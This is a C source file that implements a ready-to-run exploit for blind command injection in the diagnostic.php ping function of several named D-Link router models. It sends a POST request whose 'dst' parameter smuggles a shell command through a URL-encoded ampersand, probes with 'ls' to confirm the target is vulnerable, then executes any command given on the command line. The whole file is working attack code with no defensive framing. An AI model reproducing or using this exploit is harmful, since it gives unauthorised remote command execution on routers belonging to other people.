// "DIR-815 v1.03b02, DIR-645 v1.02, DIR-645 v1.03, DIR-600 below v2.16b01, DIR-300 revB v2.13b01, DIR-300 revB v2.14b01, DIR-412 Ver 1.14WWB02, DIR-456U Ver 1.00ONG, DIR-110 Ver 1.01

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *data, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST /diagnostic.php HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
             "Connection: close\r\n"
             "Content-Length: %zu\r\n\r\n"
             "%s",
             target_ip, strlen(data), data);
}

// Function to send an HTTP POST request and receive the response
int send_http_post_request(const char *target_ip, const char *data, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP POST request
    create_http_post_request(target_ip, data, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, response_size);
    bytes_received = recv(sock, response, response_size - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to check if the target is vulnerable
int check_vulnerability(const char *target_ip) {
    char response[MAX_RESPONSE_SIZE];
    char data[256];

    snprintf(data, sizeof(data), "act=ping&dst=%%26 ls%%26"); // URL encode '&' as '%26'

    if (send_http_post_request(target_ip, data, response, sizeof(response)) < 0) {
        return 0; // Not vulnerable
    }

    if (strstr(response, "<report>OK</report>") != NULL) {
        return 1; // Target is vulnerable
    }

    return 0; // Target is not vulnerable
}

// Function to execute the command
void execute_command(const char *target_ip, const char *cmd) {
    char response[MAX_RESPONSE_SIZE];
    char data[256];

    snprintf(data, sizeof(data), "act=ping&dst=%%26 %s %%26", cmd); // URL encode '&' as '%26'

    if (send_http_post_request(target_ip, data, response, sizeof(response)) < 0) {
        fprintf(stderr, "Command execution failed\n");
        return;
    }

    // Note: The response is not available due to blind command injection
    printf("Command sent: %s\n", cmd);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)) {
        execute_command(target_ip, cmd); // Execute the command
    }

    return EXIT_SUCCESS;
}
